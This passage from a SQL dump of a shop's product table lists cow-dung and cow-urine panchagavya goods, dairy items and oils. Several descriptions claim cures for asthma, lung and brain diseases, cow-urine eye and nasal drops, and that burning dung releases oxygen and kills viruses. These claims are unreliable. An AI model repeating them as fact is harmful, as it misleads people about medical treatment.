(43, 6, 15, 0, 'Panchgavya Soap', '', 'panchagavya-soap', 1, 1, '0004', 0, '<p>Natural oxygen for skin, for general use &amp; for all types of skin-related problems. Protects your skin from roughness, dryness, keeps your skin refreshed, and prevents your skin from damage. 100% lather and chemical-free Panchagavya Cow Dung Soap specially made for absolute skin protection. &nbsp;</p>\r\n<p>Ingredients</p>\r\n<ul>\r\n<li>Gomuthra</li>\r\n<li>Cowdung Essence</li>\r\n<li>Neem Oil</li>\r\n<li>Coconut Oil</li>\r\n<li>Multani Matti</li>\r\n<li>Ochre, Turmeric</li>\r\n<li>Camphor</li>\r\n<li>Tulsi</li>\r\n<li>Alovera</li>\r\n<li>Rita</li>\r\n<li>Shegekai</li>\r\n<li>Silicate 0.01%. &nbsp;</li>\r\n</ul>', 1, '2022-04-07 07:31:48', '2022-07-27 06:14:26', 0, 1, '', '', 0, 0, 0, '18', 0, '<p>Can be applied on both face and body.</p>\r\n<p>Store in a cool, dry place to avoid melting the soap.</p>', '', '', ''),
(44, 6, 15, 0, 'Panchagavya Shampoo', '', 'panchagavya-shampoo', 1, 1, '0005', 0, '<p>For Good Healthy Hair</p>\r\n<p>Heals disease to feel relief helps in stopping premature hair loss, formation of white hair &amp; removing dandruff, Makes hair stronger &amp; shiny. Ensures peaceful sleep. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine Shaar</li>\r\n<li>Aritha, Shikakai</li>\r\n<li>Nagarmotha</li>\r\n<li>Amla</li>\r\n</ul>', 1, '2022-04-07 07:42:29', '2022-07-27 06:05:10', 0, 0, '', '', 0, 0, 0, '18', 0, '<p>Dosage: Apply to your scalp and massage until it lathers and washes or as directed by the Ayurvedic Doctor.&nbsp;</p>', '', '', ''),
(45, 6, 15, 0, 'Gomayadi Malham', '', 'gomayadi-malham', 1, 1, '0006', 0, '<p>For Skin Related Diseases</p>\r\n<p>Useful for acne, bruises, skin infections. &nbsp;</p>\r\n<p>Ingredients</p>\r\n<p>Desi cow gaumutra, gomay rus, panchagavya ghrita, turmeric, desi cow buttermilk, neem, coconut oil. &nbsp;</p>', 1, '2022-04-07 07:45:01', '2022-07-27 05:57:18', 1, 0, '', '', 0, 0, 0, '18', 0, '<p>Dosage: Apply on the affected area and leave for one hour or as directed by gavya siddh.&nbsp;</p>', '', '', ''),
(46, 12, 3, 0, 'Cow Dung Cake', '', 'cow-dung-cake', 1, 1, 'PI/CDC/01', 0, '<p>Cow Dung Cake is meant for Havan (gives good oxygen, removes negative energy, and also mosquito repellant).</p>\r\n<p>Cow Dung Cakes have been used in traditional Indian households for yagnas, ceremonies, and rituals. Pure desi cow dung cake. 100% Pure &amp; Best, organic, and eco-friendly. Cow Dung Cake is used to purify the air as it is said to release oxygen when burnt with ghee. It removes the negative energy of the home and produces prana [oxygen] in the environment. The smoke acts as an insect repellent and a disinfectant.&nbsp;</p>\r\n<p>&nbsp;&nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Desi cow dung</p>', 1, '2022-04-07 08:55:00', '2022-11-22 10:05:13', 0, 1, '', '<p>Can be used for havans</p>', 0, 0, 0, '5%', 0, '<p>Used in yagnas/havan/homa pooja and various religious activities.</p>', '', '', ''),
(47, 9, 18, 0, 'GhanaJeevamrtham', '', 'ghanajeevamrtha', 1, 1, 'VA/GJ/01', 0, '<p>Biodigester&nbsp;</p>\r\n<p>It is an organic fertilizer that enriches the soil and plant and provides all the nutrients required for the growth of the plant. It is a rich source of Nitrogen and valuable micro-organisms which naturally enhance soil fertility.</p>', 1, '2022-04-07 08:59:17', '2022-08-03 05:41:45', 0, 1, '', '', 0, 0, 0, '', 0, '<p>Add 250gms around trees and 50gms around plants once in a crop</p>', '', '', ''),
(127, 12, 42, 0, 'Lavender Sambrani Cone', '', 'lavender-sambrani-cone', 1, 1, '', 0, '<p>The sweet, floral aroma of Lavender is the best way to release stress and relax your body and mind. Lavender has a delightfully gentle scent that soothes and freshens the mind. Lavender is also commonly used for Aromatherapy, Home fragrance, Meditation, Yoga etc,.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Lavender Aroma</li>\r\n</ul>', 1, '2022-11-11 10:08:46', '2022-11-11 10:08:46', 0, 0, '', '', 0, 0, 0, '', 0, '<p>Light the tip of the Sambrani Cone and allow the flame to catch. Gently put out the flame with care. Place it on the Sambrani Cone holder.</p>', '', '', ''),
(49, 9, 18, 0, 'Pest Control', '', 'pest-control', 1, 1, 'VA/PC/01', 0, '<p>100% organic, effective, and with no residual effect. It is a Natural product that can be used either dry or wet without harming plant tissue. &nbsp;It reduces the laying and hatching of eggs by different insects on the plants. It is specially designed for plant protection.&nbsp;</p>\r\n<p>Ingredients :</p>\r\n<p>Gaumutra<br />Garlic<br />Green chilly<br />Pepper<br />Ginger<br />Jaggery</p>', 1, '2022-04-07 09:11:49', '2022-08-03 05:40:51', 0, 1, '', '', 0, 0, 0, '', 0, '<p>Mix 500ml of pest control liquid with 25 liters of water.&nbsp; Spray diluted solution once a month or when you notice pests in the garden.&nbsp;</p>\r\n<p>Do not add any pesticides or chemicals to this solution.</p>', '', '', ''),
(50, 9, 18, 0, 'Jeevamrutham', '', 'jeeva-amrutha', 1, 1, 'VA/JA/01', 0, '<p>For the growth of plants &amp; trees&nbsp;</p>\r\n<p>Jeevaamrutha is liquid organic manure popularly used for organic gardening. It is considered to be an excellent source of natural carbon, biomass, nitrogen, phosphorous potassium, and a lot of other micronutrients required for plants.&nbsp; Jeevaamrutha adds organic matter to the soil which improves soil structure, aeration, soil moisture-holding capacity, and water infiltration. Jeevaamrutha improves the quality and yield of fruits, vegetables, and other crops.&nbsp;</p>', 1, '2022-04-07 09:15:07', '2022-08-03 05:41:14', 0, 1, '', '', 0, 0, 0, '', 0, '<p>Take 500ml of Jeevaamrutha and add it to 1 liter of plain water. Mix them thoroughly. Pour the diluted liquid into the soil. Repeat the process every 15 days. &nbsp;</p>', '', '', ''),
(52, 7, 16, 0, 'Abhyangha Taila', '', 'abhyangha-taila', 1, 1, '0001', 0, '<p>For all body massage&nbsp;</p>\r\n<p>Improves skin texture and adds radiance while relieving aching joints and removing toxins through the skin. It is excellent for body &amp; head massage &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Bhartiya Gomatha\'s Gritha</li>\r\n<li>Gomutra</li>\r\n<li>Takra</li>\r\n<li>Gomayarasa</li>\r\n<li>Ksheera</li>\r\n<li>Till</li>\r\n<li>Coconut</li>\r\n<li>Mustard</li>\r\n<li>Castrol</li>\r\n<li>Lemon Oils</li>\r\n</ul>', 1, '2022-04-07 09:39:05', '2022-11-11 11:05:34', 1, 1, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Apply twice a day, or as directed by an Ayurvedic doctor.&nbsp;</p>', '', '', ''),
(53, 7, 16, 0, 'Roll On', '', 'pain-relief-oil', 1, 1, 'TA/RO/01', 0, '<p>For treating arthritis, Joints pains &amp; Other pains&nbsp;</p>\r\n<p>Use full in Asthma, Sinus, Breathing problems, Bronchitis, lungs, Brain, Cold, Nose allergies. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Ghritha</li>\r\n<li>Tulsi</li>\r\n<li>Turmeric</li>\r\n<li>Clove</li>\r\n<li>Nutmeg</li>\r\n<li>Pepper</li>\r\n<li>Coriander</li>\r\n<li>Nilgiri</li>\r\n<li>Rose Mary</li>\r\n<li>Lavender</li>\r\n<li>Amrithdhara</li>\r\n</ul>', 1, '2022-04-07 09:43:11', '2022-08-03 05:25:20', 0, 1, '', '', 0, 0, 0, '12', 0, '<p>Apply twice a day on the affected area.</p>', '', '', ''),
(54, 7, 16, 0, 'Universal Relief Oil', '', 'universal-relief-oil', 1, 1, 'TA/URO/01', 0, '<p>For headache &amp; cold&nbsp;</p>\r\n<p>Helps in relief from headache &amp; cold.</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Ghritha</li>\r\n<li>Tulsi</li>\r\n<li>Turmeric</li>\r\n<li>Clove</li>\r\n<li>Nutmeg</li>\r\n<li>Pepper</li>\r\n<li>Coriander</li>\r\n<li>Nilgiri</li>\r\n<li>Rose mary</li>\r\n<li>Lavender</li>\r\n<li>Amrithdhara&nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 09:52:36', '2022-11-11 11:07:32', 1, 1, '', '', 0, 0, 0, '12', 0, '<p>&nbsp;Dosage: Apply twice a day, or as directed by Ayurvedic doctor.&nbsp;</p>', '', '', ''),
(55, 7, 16, 0, 'Dasharathana Oil', '', 'dasharathana-oil', 1, 1, '0004', 0, '<p>For mind cooling &amp; relief from headaches healthy sleep, migraine, sinus, stress reliever&nbsp;</p>\r\n<p>Helps in mind cooling &amp; relief from headaches, healthy sleep, migraine, sinus, and stress. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Ghritha</li>\r\n<li>Tulsi</li>\r\n<li>Turmeric</li>\r\n<li>Clove</li>\r\n<li>Nutmeg</li>\r\n<li>Pepper</li>\r\n<li>Coriander</li>\r\n<li>Nilgiri</li>\r\n<li>Rosemary</li>\r\n<li>Lavender</li>\r\n<li>Amrithdhara&nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 09:58:25', '2022-11-11 11:06:03', 1, 1, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Apply twice a day, or as directed by an Ayurvedic doctor.&nbsp;</p>', '', '', ''),
(56, 7, 16, 0, 'Skin Ointment', '', 'skin-ointment', 1, 1, 'TA/SO/01', 0, '<p>For skin allergies&nbsp;</p>\r\n<p>Helps in treating skin allergies &amp; diseases. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Gomuthram</li>\r\n<li>Gomarasam</li>\r\n<li>Neem</li>\r\n<li>Ashwagandha&nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 10:04:06', '2022-08-03 05:37:02', 0, 0, '', '', 0, 0, 0, '12', 0, '<p><strong>Dosage:</strong> Apply twice a day on the affected area.&nbsp;</p>', '', '', ''),
(57, 7, 16, 0, 'Panchagavya Ear Drops', '', 'panchagavya-ear-drops', 1, 1, '0006', 0, '<p>Ear related problems&nbsp;</p>\r\n<p>Use full for protection of healthy ear. &nbsp;</p>\r\n<p>&nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<p>Bharathiya Gomatha\'s Gomuthra processed. &nbsp; &nbsp; &nbsp;&nbsp;</p>', 1, '2022-04-07 10:06:06', '2022-08-03 05:37:26', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Use only as directed by Ayurvedic Doctor&nbsp;</p>', '', '', ''),
(58, 7, 16, 0, 'Panchagavya Eye Drops', '', 'panchagavya-eye-drops', 1, 1, '0007', 0, '<p>Eye related problems&nbsp;</p>\r\n<p>Use full for Protection of healthy eyes. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Bharathiya Gomatha\'s Gomuthra</li>\r\n<li>Pure Rose Water</li>\r\n<li>Pure Small Bee\'s Honey&nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 10:12:33', '2022-08-03 05:37:55', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Use only as directed by the Ayurvedic Doctor</p>', '', '', ''),
(59, 7, 16, 0, 'Panchagavya Nasike Drops', '', 'panchagavya-nasike-drops', 1, 1, '0008', 0, '<p>Relief from asthma, easy breathing, sinus/ migrane problem &amp; snouring headace&nbsp;</p>\r\n<p>It helps to cure asthma, anti-snoring, sinus, breathing problems, bronchitis, all types of lung diseases, brain diseases &amp; nose allergies. &nbsp;</p>\r\n<p>Ingredients: &nbsp;</p>\r\n<p>Desi Gomatha Gomuthra, Gomaya Ras, Ghritha, Ksheera, Takra, processed in sunlight, added with Amrithdhara. &nbsp; &nbsp;</p>', 1, '2022-04-07 10:15:46', '2022-07-27 12:42:24', 1, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Insert the dropper a little way into the nostril and squeeze the bulb gently to release the required number of drops. Repeat in other nostrils.&nbsp;</p>', '', '', ''),
(60, 7, 16, 0, 'Panchagavya Pain Relief Oil', '', 'panchagavya-pain-relief-oil', 1, 1, 'TA/PRO/01', 0, '<p>Joints &amp; muscles problem related to all types of pain&nbsp;</p>\r\n<p>For treating arthritis, Back pains, Spondilties, Joint pain</p>\r\n<p>&nbsp;Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Gomuthra</li>\r\n<li>Gomaya Rasa</li>\r\n<li>Gingelly Oil</li>\r\n<li>Ajawan Satwa</li>\r\n<li>Pacha Karpoora Ashwagandha</li>\r\n<li>Nilagiri Thaila</li>\r\n<li>Tulasi Thaila</li>\r\n<li>Pudina Thaila</li>\r\n<li>Lavanga Thaila</li>\r\n<li>Shanka Pushpi</li>\r\n<li>Datthoora</li>\r\n<li>Hutjode</li>\r\n<li>Nirgundi &amp; other herbs&nbsp; &nbsp;&nbsp;</li>\r\n</ul>', 1, '2022-04-07 10:18:23', '2022-08-03 05:38:19', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Apply 15 to 20 drops of oil &amp; gently rub it up to form heat in the affected area.&nbsp;</p>', '', '', ''),
(62, 8, 17, 0, 'Castor Oil', '', 'castrol-oil', 1, 1, '0001', 0, '<p>Ghani oil &amp; cold-pressed</p>\r\n<p>Castor oil helps heal wounds by stimulating the growth of new tissue, reducing dryness, and preventing the build-up of dead skin cells. 100% organic and rich with natural minerals, vitamins &amp; antioxidants No chemicals, No heat process, No preservatives. Nutritional Facts Calories, Monounsaturated Fats, Vitamin E. &nbsp;&nbsp;</p>', 1, '2022-04-07 12:08:49', '2022-04-14 04:33:51', 0, 1, '', '', 0, 0, 0, '5', 0, '', '', '', ''),
(63, 8, 17, 0, 'Seasame Oil', '', 'seasame-oil', 1, 1, '0002', 0, '<p>Ghani oil &amp; cold-pressed</p>\r\n<p>The cold press technique keeps the nutrients intact which makes the oil rich in antioxidants and full of nutrition. It is good for the skin, hair, and melting extra fat in our body, reducing the risk of coronary heart disease (CHD). In addition, it helps to lower bad cholesterol. &nbsp;100% organic and rich with natural minerals, vitamins &amp; antioxidants No chemicals, No heat process, No preservatives. &nbsp; Nutritional Facts: &nbsp;Polyunsaturated &amp; Monounsaturated Fats,Vitamin K, VitaminE, Choline, Protein.&nbsp;</p>', 1, '2022-04-07 12:12:15', '2022-04-14 04:33:02', 0, 1, '', '', 0, 0, 0, '5', 0, '', '', '', ''),
(64, 8, 17, 0, 'Coconut Oil', '', 'coconut-oil', 1, 1, '0003', 0, '<p>Ghani oil &amp; cold-pressed</p>\r\n<p>Unrefined cold-pressed coconut oil is useful for weight loss, hair, skin, and cooking. It contains short and medium-chain fatty acids that help in taking off excessive weight 100% organic, natural, tasty, and healthy cooking oil. &nbsp;No chemicals, No heat process, No preservatives, Nutritional Facts Polyunsaturated &amp; Monounsaturated Fatty Acids, Vitamin E, Vitamin K, Phytosterols.&nbsp;</p>', 1, '2022-04-07 12:15:34', '2022-04-14 04:32:17', 0, 1, '', '', 0, 0, 0, '5', 0, '', '', '', ''),
(65, 8, 17, 0, 'Ground Nut Oil', '', 'ground-nut-oil', 1, 1, '0004', 0, '<p>Ghani oil &amp; cold-pressed&nbsp;</p>\r\n<p>Cold Pressed Groundnut oil is rich in nutrients, which makes the oil rich in antioxidants and full of nutrition - Free from chemicals -Obtain through the traditional method. Groundnut oil is a rich source of minerals and vitamins which help in regulating metabolism, converting fat and carbohydrates into energy, and facilitating bone and tissue formation. 100% organic, natural, tasty, and healthy cooking oil. No chemicals, No heat process, No preservatives. Nutritional facts&nbsp; Polyunsaturated &amp; Monounsaturated&nbsp;</p>', 1, '2022-04-07 12:18:46', '2022-04-14 04:31:25', 0, 1, '', '', 0, 0, 0, '5', 0, '', '', '', ''),
(66, 8, 17, 0, 'Pure Haldi powder', '', 'pure-haldi-powder', 1, 1, '0005', 0, '<p>Acts as medical (Non chemical)</p>\r\n<p>The best-known health benefit of turmeric is its anti-inflammatory and antioxidant properties, which reduce swelling and pain in conditions such as arthritis. Turmeric is used for arthritis, heartburn (dyspepsia), joint pain, stomach pain, ulcerative colitis, bypass surgery, intestinal gas, stomach bloating, loss of appetite, jaundice, liver problems. &nbsp;</p>', 1, '2022-04-07 12:23:26', '2022-04-14 04:29:18', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(67, 8, 17, 0, 'Rock Salt', '', 'rock-salt', 1, 1, '0006', 0, '<p>Medical value helps in activating organs&nbsp;</p>\r\n<p>Helps in activating organs, better digestion, immunity boosts, weight loss, reduced stress, and healthy skin. It has low iodine and adding this to your diet will give you a healthier meal as well as a heal thier lifestyle.&nbsp;</p>', 1, '2022-04-07 12:26:04', '2022-04-14 04:27:36', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(68, 8, 17, 0, 'Gritha (Desi Cow Ghee)', '', 'gritha-desi-cow-ghee', 1, 1, '0007', 0, '<p>Made from pure desi cow milk, 100% pure &amp; healthy, natural taste. Made by Vedic method. Boosts immunity&nbsp;</p>', 1, '2022-04-07 12:29:11', '2022-04-07 12:29:11', 0, 0, '', '', 0, 0, 0, '12', 0, '', '', '', ''),
(69, 11, 19, 0, 'Milk', '', 'milk', 1, 1, '0001', 0, '<p>A perfect blend of healthy nutrition and a natural flavor, it is 100% natural and unprocessed. Every sip is bound to make you feel energized. Desi or indigenous cow milk contains a special protein called A2 type beta-casein protein, which helps us to stay healthy and strong.</p>\r\n<p><strong>Health benefits</strong></p>\r\n<ul>\r\n<li>Desi cow milk is easy to digest.</li>\r\n<li>It\'s rich in good protein and minerals. Contains a good source of Vitamin B2, B3 &amp; A.</li>\r\n<li>As per Ayurveda, Desi cow milk is known to improve brain development and help cure many diseases.</li>\r\n<li>Drinking A2 Desi cow milk improves the immunity level in the body to fight against diseases.</li>\r\n</ul>', 1, '2022-04-08 04:02:23', '2022-04-08 04:05:54', 0, 1, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(70, 11, 21, 0, 'Cheese', '', 'cheese', 1, 1, '0002', 0, '<p>100% Organic, Cheese is made using Desi cow&rsquo;s milk. This delicious cheese is creamy, silky, and soft.&nbsp; It is one of the healthiest cheeses to consume as its low in fat.</p>\r\n<p><strong>Health benefits:</strong></p>\r\n<ul>\r\n<li>Rich in protein &amp; calcium</li>\r\n<li>Prevents obesity and heart disease.</li>\r\n<li>Rich in Vitamin B-12</li>\r\n</ul>', 1, '2022-04-08 04:09:09', '2022-04-08 04:09:09', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(71, 11, 22, 0, 'Butter', '', 'butter', 1, 1, '0003', 0, '<p>100% Organic, butter made of Desi cow milk, has no preservatives used in it, no adulteration, safe for kids, elderly.</p>\r\n<p><strong>Health benefits:</strong></p>\r\n<ul>\r\n<li>Rich in important nutrients such as vitamins A, D, B12 and Omega-3 fatty acids.</li>\r\n<li>Rich in Vitamin E; a powerful antioxidant.</li>\r\n<li>Rich in Vitamin K2 which helps in bone and heart health.</li>\r\n</ul>', 1, '2022-04-08 04:11:21', '2022-04-08 04:11:21', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(72, 11, 23, 0, 'Milk Powder', '', 'milk-powder', 1, 1, '0004', 0, '<p>Gogarbha milk powder is prepared from the milk of desi cow and contains all the vitamins and minerals found in desi cow milk. Gogarbha milk powder is pure and safe for use. No added preservatives.</p>\r\n<p><strong>Health Benefits:</strong></p>\r\n<ul>\r\n<li>Provide complete nutrition as it is a high source of calories, protein, contains a host of vitamins such as A, D, E, and K</li>\r\n<li>Rich source of minerals such as magnesium, calcium, zinc, potassium, and phosphorous.</li>\r\n</ul>\r\n<p><strong>Ingredients:</strong> Milk</p>', 1, '2022-04-08 04:16:23', '2022-06-02 09:57:20', 0, 1, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(73, 11, 24, 0, 'Paneer', '', 'paneer', 1, 1, '0005', 0, '<p>Gogarbha paneer gives you an authentic taste of homemade paneer. This creamy and tasty paneer is made from desi cow&rsquo;s milk. It is good for you as it is organic, pure, safe, and has a high taste.</p>\r\n<p><strong>Health benefits:</strong></p>\r\n<ul>\r\n<li>Rich in Protein.</li>\r\n<li>Maintains Blood Sugar Levels.</li>\r\n<li>Good for Heart Health.</li>\r\n<li>Strong Teeth &amp; Bones.</li>\r\n</ul>\r\n<p><strong>Ingredients:</strong></p>\r\n<p>Milk Solids &amp; Curd or Citric Acid.</p>', 1, '2022-04-08 04:21:26', '2022-06-02 09:54:49', 0, 1, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(74, 11, 20, 0, 'Yogurt', '', 'curd', 1, 1, '0006', 0, '<p>Gogarbha yogurt is a natural choice for breakfast or a snack. Enjoy the creamy, nutritious, and delicious yogurt.</p>\r\n<p><strong>Health Benefits:</strong></p>\r\n<ul>\r\n<li>Yogurt is rich in nutrients and minerals that play a key role in bone health.</li>\r\n<li>Yogurt provides probiotics, vitamins, and minerals, all of which may boost immune health and prevent certain illnesses.</li>\r\n<li>Regardless of its fat content, yogurt appears to benefit heart health by increasing &ldquo;good&rdquo; HDL cholesterol and reducing blood pressure.</li>\r\n<li>Yogurt is high in protein, which is very filling and may improve your diet overall.</li>\r\n<li>It may help reduce the risk of some diseases, while also benefiting digestive health and weight control.</li>\r\n</ul>\r\n<p>&nbsp;</p>', 1, '2022-04-08 04:25:22', '2022-06-02 10:01:54', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(76, 12, 26, 0, 'Panchagavya Diyas', '', 'diyas', 1, 1, 'PICDS/01', 0, '<p>Panchgavya Diya is made of cow dung, gomutra, milk, curd, and ghee. It is 100% natural and biodegradable. It gives a feeling of positivity when burnt. Diya&rsquo;s are very attractive and completely eco-friendly. Burning of Panchgavya Diyas are hygenic and good for the home; it reduces or kills the harmful bacteria and viruses present in the surrounding atmosphere. The burning of Panchgavya diyas removes foul odour also from the surrounding atmosphere. Ash generated from the burning of diyas can be used as an effective fertilizer.</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Cowdung</li>\r\n<li>Gomutra&nbsp;</li>\r\n<li>Milk</li>\r\n<li>Curd</li>\r\n<li>Ghee</li>\r\n</ul>\r\n<p>&nbsp;</p>\r\n<p><strong>These are hand-made cow dung diya so please expect slight variance in the designs, shapes, and overall dimensions.</strong></p>\r\n<p>&nbsp;</p>', 1, '2022-04-08 04:36:11', '2022-11-11 10:57:16', 0, 1, '', '', 0, 0, 0, '5%', 0, '<p><strong>Tip: </strong>Use a round cotton wick instead of long wicks to avoid spillage of oil.&nbsp;</p>\r\n<p><span class=\"blue-underline\" data-startindex=\"120\" data-endindex=\"170\" data-paragraphid=\"10\"><strong>Safety Warning:</strong> The diya as a whole is flammable.</span></p>', '', '', ''),
(75, 11, 25, 0, 'Curd', '', 'curd-1', 1, 1, '0007', 0, '<p>We use 100% Desi cow milk to set curd and follow the simple traditional process which gives us superior<br />quality curd. Natural Curd is very healthy. It is fermented with the addition of active probiotic culture that makes it the perfect addition with daily meal.</p>\r\n<p>Health benefits:<br />It contains natural vitamins and minerals.<br />High in protein<br />Builds immunity</p>', 1, '2022-04-08 04:27:29', '2022-06-07 04:52:18', 0, 1, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(77, 12, 27, 0, 'Kewda Dhoop Sticks', '', 'dhoop-sticks', 1, 1, '0002', 0, '<p>Kewda has always been in the first position while offering pooja. Experience the pure tradition at your home with Kewda sticks. The pleasant, mild fragrance of Kewda is infinitely desirable. They create a pleasant ambiance. Experience the traditional fragrance for peace and prosperity at home.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Natural herbs</li>\r\n<li>Kewda Aroma.</li>\r\n</ul>', 1, '2022-04-08 04:44:05', '2022-11-07 12:36:06', 0, 1, '', '', 0, 0, 0, '5%', 0, '<p>Light the tip of the Dhoop Stick and allow the flame to catch. Gently put out the flame with care. Place it on the Dhoop Stick holder.</p>', '', '', '');
INSERT INTO `products` (`id`, `cat_id`, `subcat_id`, `sub_sub_id`, `name`, `ptitle`, `page_url`, `material_id`, `color_id`, `pcode`, `vase`, `overview`, `user_id`, `created_date`, `modified_date`, `status`, `home_page`, `meta_keywords`, `meta_description`, `bundle_product`, `special`, `exclusive`, `tax`, `minimum_buy`, `how_to_use`, `youtube`, `youtubelink`, `ptype`) VALUES
(126, 12, 26, 0, 'Diya Batti', '', 'ghee-diya', 1, 1, 'DB01', 0, '<p>Lighting Cow Ghee Diya&rsquo;s is supposed to increase the sattvic tattva, which includes light, bliss, and goodness. A sattvic mind is always steady and blissful internally. It is a practice to light Cow Ghee Diya\'s for health, wealth, and happiness. These Pure Cow Ghee Diya&rsquo;s have a burning time of 20-30 minutes.&nbsp;</p>\r\n<p><strong>Ingredients:</strong></p>\r\n<ul>\r\n<li>Desi Cow ghee</li>\r\n<li>Vegetable oil.</li>\r\n</ul>', 1, '2022-11-08 07:30:02', '2022-11-11 10:58:58', 0, 0, '', '', 0, 0, 0, '12%', 0, '', '', '', ''),
(78, 12, 28, 0, 'Agarbatti', '', 'agarbathis', 1, 1, '0003', 0, '<p>Gogarbha Agarbatti purifies the complete atmosphere of your home. The fragrance of Agarbatti makes your entire surrounding clean &amp; pleasing, it brings peace to mind while harmonizing the atmosphere including physical and spiritual well-being. It is also useful to kill bacteria and dangerous viruses. The natural essence of dhoop provides divine purity. Upon burning agarbatti made from desi, the cow is equivalent to performing a sacrifice (Yagna).</p>\r\n<p>&nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Desi cow dung &amp; Herbs</p>', 1, '2022-04-08 04:47:03', '2022-08-23 04:54:01', 1, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(79, 12, 31, 0, 'Vibhoothi', '', 'vibhoothi', 1, 1, '0004', 0, '<p>Vibhoothi is an age-old practice, it is made of dried cow-dung cakes in a traditional/ sacred way followed since ancient times. Cow-Dung cakes are dried on rocks to avoid dust and sand. Cow-dung covered with hay &amp; paddy husk (without rice), baked to get the sacred ash called Vibhoothi. After burning cow dung, it must be kept for 7-10 days to get a fire extinguisher. In the end, cow dung cakes will be burned completely &amp; become ash. The cow dung from Indian breed cows is best used for making Vibhoothi.</p>\r\n<p>Ingredients:</p>\r\n<p>Desi Cow Dung.</p>', 1, '2022-04-08 04:48:15', '2022-07-18 10:34:12', 0, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(80, 12, 32, 0, 'Cowdung Bhasma', '', 'cowdung-bhasma', 1, 1, '0005', 0, '<p>The ash is basically the residue of Indian cow dung (Desi Cow) that is burned in traditional methods in sacred fire.&nbsp;Gomaya Bhasma helps in the restoration of lost micronutrients in treated water. Bhasma helps in boosting Prana Shakti (Vital Air) in the human body. Bhasma made from desi cow dung ash helps in skin healing as well. Helps in preventing early age joint pains. Increases the alkaline &amp; reduces the acidic content.</p>\r\n<p>Ingredients:</p>\r\n<p>Desi Cow Dung</p>', 1, '2022-04-08 04:49:34', '2022-08-23 04:54:52', 1, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(81, 12, 34, 0, 'Cowdung Samhidhi', '', 'cowdung-bhasma-1', 1, 1, '0006', 0, '', 1, '2022-04-08 04:50:53', '2022-08-23 04:54:18', 1, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
(82, 12, 35, 0, 'Cowdung Sambrani Cups', '', 'cowdung-sambrani-cups', 1, 1, 'PI/CSCP/01', 0, '<p>Gogarbha Sambrani Cups are made of desi breed cow\'s dung filled with some special composition of herbs to spread good vibes at your home or office. It works as a complete incense for havan, pooja use, and spiritual purposes. These Sambrani Cups are used to perform Yagna. Helps to create an aesthetic and spiritual environment around you.<br />Burning cowdung dhoop sticks helps to purify the air in the area and serves as a natural mosquito repellant.</p>\r\n<p>Ingredients:</p>\r\n<ul>\r\n<li>Desi Cow dung</li>\r\n<li>Joss</li>\r\n<li>Loban Sambrani.</li>\r\n</ul>', 1, '2022-04-08 04:52:18', '2022-10-27 11:54:24', 0, 0, '', '', 0, 0, 0, '', 0, '<p>Light the tip of the Cowdung Sambrani Cup and allow the flame to catch. Gently put out the flame with care. Place it on the Cowdung Sambrani Cup holder.</p>', '', '', ''),
(83, 12, 37, 0, 'Cow Dung Bricks', '', 'cow-dung-bricks', 1, 1, '0008', 0, '<p>Gogarbha cow dung bricks are eco-friendly. The house, made of cow dung bricks, not only remains cool in summer, but the air inside this house is also pure. If the temperature outside is 40 degrees, then it remains 28 to 31 degrees inside the house.</p>\r\n<p>&nbsp;</p>\r\n<p>Ingredients:</p>\r\n<p>Desi cow dung</p>', 1, '2022-04-08 09:35:06', '2022-08-23 04:55:24', 1, 0, '', '', 0, 0, 0, '', 0, '', '', '', ''),
